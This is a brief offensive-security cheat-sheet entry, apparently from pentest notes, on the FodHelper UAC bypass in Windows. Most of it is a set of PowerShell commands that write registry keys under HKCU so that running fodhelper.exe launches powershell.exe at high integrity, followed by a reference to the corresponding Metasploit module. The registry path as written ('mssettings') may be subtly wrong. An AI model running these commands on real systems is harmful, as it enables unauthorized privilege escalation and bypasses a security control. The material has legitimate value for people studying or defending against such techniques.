# UAC

### Bypass: FodHelper

Fodhelper is an application for region specific keyboard settings and runs as a high integrity process.

Creating the following registry keys will run a custom attacker controlled command as high integrity \(here powershell.exe\):

```text
New-Item -Path HKCU:\Software\Classes\mssettings\shell\open\command -Value powershell.exe –Force
New-ItemProperty -Path HKCU:\Software\Classes\mssettings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe
```

This is also integrated in metasploit \(exploit/windows/local/bypassuac\_fodhelper\).

